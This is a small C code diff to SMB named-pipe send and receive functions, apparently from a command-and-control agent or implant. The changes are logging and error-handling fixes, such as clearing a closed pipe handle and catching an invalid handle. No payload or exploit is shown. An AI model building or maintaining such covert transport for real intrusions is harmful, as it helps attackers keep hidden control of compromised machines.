@@ -26,6 +26,7 @@ BOOL SmbSend(PPackage package)
     PackageAddInt32(Send, xenonConfig->SmbId);
     PackageAddBytes(Send, package->buffer, package->length, FALSE);
 
+    _dbg("[SMB Comms] Sending msg with %d bytes : SmbId [%x]", package->length, xenonConfig->SmbId);
 
 	/* Not initialized Yet */
 	if ( !xenonConfig->SmbPipe )
@@ -68,15 +69,21 @@ BOOL SmbSend(PPackage package)
 	/* Send if pipe is already initialized */
 	if ( !PackageSendPipe(xenonConfig->SmbPipe, Send->buffer, Send->length) )
 	{
-		DWORD error = GetLastError();
-		_err("Failed to write data to pipe. ERROR : %d", error);
+        DWORD error = GetLastError();
+        /* Means that the client disconnected/the pipe is closing. */
 		if ( error == ERROR_NO_DATA )
 		{
 			if ( xenonConfig->SmbPipe ) {
 				CloseHandle(xenonConfig->SmbPipe);
+                xenonConfig->SmbPipe = NULL;
 				goto END;
 			}
 		}
+        if ( error == ERROR_INVALID_HANDLE )
+        {
+            _err("INVALID_HANDLE");
+            goto END;
+        }
 	}
 
 	Success = TRUE;
@@ -133,8 +140,6 @@ BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
             *ppOutData = Buffer;
             *pOutLen = PackageSize;
 
-            
-            _dbg("Successfully read 0x%x bytes from pipe", PackageSize);
         }
         else if ( PackageSize > 0 )
         {
